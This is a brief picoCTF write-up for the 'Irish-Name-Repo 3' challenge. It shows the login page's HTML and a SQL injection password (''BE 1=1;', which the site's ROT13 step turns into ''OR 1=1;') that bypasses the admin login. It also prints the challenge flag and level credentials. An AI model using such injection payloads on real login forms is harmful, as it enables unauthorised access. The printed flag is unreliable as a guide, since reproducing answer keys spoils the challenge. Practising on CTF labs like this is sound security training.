# Irish-Name-Repo 3
## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!
## Pistas
P1: Seems like the password is encrypted.
P2:
## Datos de acceso al nivel
```bash
Usuario: Dena
Contraseña: Notedigo
```
## Solución
```bash
Pass siguiente lvl: picoCTF{3v3n_m0r3_SQL_4424e7af}
--------------------------------------------------------------------
|   |   |
|---|---|
||<!doctype html>|
||<html>|
||<head>|
||<title>Login</title>|
||<link rel="stylesheet" type="text/css" href="[//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css](https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css)">|
||</head>|
||<body>|
||<div class="container">|
||<div class="row">|
||<div class="col-md-12">|
||<div class="panel panel-primary" style="margin-top:50px">|
||<div class="panel-heading">|
||<h3 class="panel-title">Admin Log In</h3>|
||</div>|
||<div class="panel-body">|
||<form action="login.php" method="POST">|
||<fieldset>|
||<div class="form-group">|
|||
||<label for="password">Password:</label>|
||<div class="controls">|
||<input type="password" id="password" name="password" class="form-control">|
||</div>|
||</div>|
||<input type="hidden" name="debug" value="0">|
|||
||<div class="form-actions">|
||<input type="submit" value="Login" class="btn btn-primary">|
||</div>|
||</fieldset>|
||</form>|
||</div>|
||</div>|
||</div>|
||</div>|
||</div>|
||</body>|
||</html>|
|||
--------------------------------------------------------------------
password: 'BE 1=1;
SQL query: SELECT * FROM admin where password = ''OR 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}
```
## Notas Adicionales

| Comando  | Descripción | 
|------------|--------------|

## Referencias 
